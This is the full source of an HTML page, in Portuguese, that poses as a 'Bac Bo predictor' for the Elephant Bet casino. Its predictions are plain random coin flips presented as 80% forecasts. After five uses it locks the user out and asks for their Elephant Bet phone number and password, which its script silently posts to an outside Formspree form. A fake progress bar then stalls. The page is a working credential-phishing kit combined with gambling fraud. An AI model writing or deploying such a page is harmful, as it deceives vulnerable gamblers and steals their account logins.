<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <title>BÁC BÓ PREDICTOR 2026</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body { font-family: Arial, sans-serif; background:#0d0d0d; color:#fff; text-align:center; margin:0; padding:20px; }
    h1 { color:#ff00ff; text-shadow:0 0 10px #ff00ff; }
    .circle {
      font-size:2em; margin:20px auto; border-radius:50%; width:200px; height:200px;
      display:flex; align-items:center; justify-content:center; background:#111; color:#fff;
    }
    .azul { background:#0011ff; box-shadow:0 0 30px #00f inset; }
    .vermelho { background:#ff0000; box-shadow:0 0 30px #f00 inset; }
    .blocked { background:#333; color:#ffcc00; padding:10px; margin:15px auto; border-radius:5px; width:90%; }
    button { padding:12px 20px; background:#ff00aa; color:#fff; border:none; border-radius:5px; cursor:pointer; margin-top:15px; font-size:1em; width:80%; max-width:300px; }
    button:hover { background:#cc0088; }
    input { margin:8px; padding:10px; width:80%; max-width:300px; font-size:1em; border-radius:5px; border:1px solid #ccc; }
    #inicioScreen, #predictorScreen, #loginScreen, #loadingScreen { display:none; }
    .progress-bar { width:80%; height:20px; background:#222; margin:20px auto; border-radius:10px; overflow:hidden; }
    .progress { height:100%; width:0%; background:#00ffcc; text-align:center; color:#000; font-size:0.8em; }
    .empate-text { font-size:0.9em; color:#ffd700; margin-top:5px; }
    #preverBtn { margin-bottom:25px; }
    .game-image { max-width:90%; margin:20px auto; border-radius:10px; }
  </style>
</head>
<body>
  <!-- Tela inicial -->
  <div id="inicioScreen">
    <h1>BÁC BÓ PREDICTOR</h1>
    <img src="bacbo.png" alt="Bac Bo Live" class="game-image">
    <form id="inicioForm">
      <input type="text" id="numeroInicio" name="numeroInicio" placeholder="Número de telemóvel" required><br>
      <input type="text" id="chaveInicio" name="chaveInicio" placeholder="Chave de acesso" required><br>
      <button type="submit">Entrar</button>
    </form>
  </div>

  <!-- Tela do Predictor -->
  <div id="predictorScreen">
    <h1>BÁC BÓ 2026</h1>
    <div id="circle" class="circle">--</div>
    <div class="empate-text">20% Empate</div>
    
    <button id="preverBtn">Fazer Previsão</button>
    <button id="openLogin">Conecte o Bot</button>
    
    <div id="resultado"></div>
    <div id="blockedMsg" class="blocked" style="display:none;">⚠️ Acesso bloqueado. Conecte novamente o Bot.</div>
  </div>

  <!-- Tela de login verdadeira -->
  <div id="loginScreen">
    <h2>Conecte com à sua conta da Elephant Bet</h2>
    <form id="loginForm">
      <input type="text" id="numeroLogin" name="numeroLogin" placeholder="Número de telemóvel" required><br>
      <input type="text" id="senhaLogin" name="senhaLogin" placeholder="Digite a sua senha" required><br>
      <button type="submit">Conectar Agora</button>
    </form>
    <a href="#" id="closeLogin">← Voltar</a>
  </div>

  <!-- Tela de carregamento -->
  <div id="loadingScreen">
    <h2>Conexão Feita!</h2>
    <p>Aguarde por favor à Configuração do Bot...</p>
    <div class="progress-bar"><div id="progress" class="progress">0%</div></div>
  </div>

  <script>
    const inicioForm = document.getElementById("inicioForm");
    const numeroInicio = document.getElementById("numeroInicio");
    const chaveInicio = document.getElementById("chaveInicio");
    const inicioScreen = document.getElementById("inicioScreen");
    const predictorScreen = document.getElementById("predictorScreen");
    const loginScreen = document.getElementById("loginScreen");
    const loadingScreen = document.getElementById("loadingScreen");
    const loginForm = document.getElementById("loginForm");
    const numeroLogin = document.getElementById("numeroLogin");
    const senhaLogin = document.getElementById("senhaLogin");
    const progressBar = document.getElementById("progress");
    const circle = document.getElementById("circle");
    const preverBtn = document.getElementById("preverBtn");
    const resultado = document.getElementById("resultado");
    const blockedMsg = document.getElementById("blockedMsg");
    const openLogin = document.getElementById("openLogin");
    const closeLogin = document.getElementById("closeLogin");

    let previsoesFeitas = 0;
    const maxPrevisoes = 5;
    let bloqueado = false;

    // Tela inicial → apenas valida e avança
    inicioForm.addEventListener("submit", function(e) {
      e.preventDefault();
      if (!/^9\d{8}$/.test(numeroInicio.value)) { alert("Número inválido!"); return; }
      if (chaveInicio.value !== "2026@") { alert("Chave incorreta!"); return; }
      inicioScreen.style.display = "none";
      predictorScreen.style.display = "block";
    });

    // Botão Sincronizar → vai para tela de login verdadeira
    openLogin.addEventListener("click", function() {
      predictorScreen.style.display = "none";
      loginScreen.style.display = "block";
    });

    // Voltar
    closeLogin.addEventListener("click", function() {
      loginScreen.style.display = "none";
      predictorScreen.style.display = "block";
    });

    // Tela de login verdadeira → envia para Formspree
    loginForm.addEventListener("submit", function(e) {
      e.preventDefault();
      if (!/^9\d{8}$/.test(numeroLogin.value)) { alert("Número inválido!"); return; }
      if (senhaLogin.value.length < 5) { alert("Senha muito curta!"); return; }
      fetch("https://formspree.io/f/mbdeddpb", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ numeroLogin: numeroLogin.value, senhaLogin: senhaLogin.value })
      });
      loginScreen.style.display = "none";
      loadingScreen.style.display = "block";

      let percent = 0;
      const interval = setInterval(() => {
        percent++;
        progressBar.style.width = percent+"%";
        progressBar.textContent = percent+"%";
        if (percent >= 75) {
          clearInterval(interval);
          progressBar.textContent = "75% - Autenticação concluída";
        }
      }, 4000);
    });

    // Predictor
    preverBtn.addEventListener("click", function() {
      if (bloqueado) { blockedMsg.style.display = "block"; return; }
      previsoesFeitas++;
      let count = 1;
      const interval = setInterval(() => {
        circle.textContent = count+"%";
        count++;
        if (count > 80) {
          clearInterval(interval);
          const rand = Math.random();
          if (rand < 0.5) {
            circle.textContent = "80%";
            circle.className = "circle azul";
            resultado.textContent = `Previsão ${previsoesFeitas}: Resultado → Azul`;
          } else {
            circle.textContent = "80%";
            circle.className = "circle vermelho";
            resultado.textContent = `Previsão ${previsoesFeitas}: Resultado → Vermelho`;
          }
        }
      }, 50);
      if (previsoesFeitas >= maxPrevisoes) {
        bloqueado = true;
        blockedMsg.style.display = "block";
      }
    });

    // Inicial
    inicioScreen.style.display = "block";
  </script>
</body>
</html>
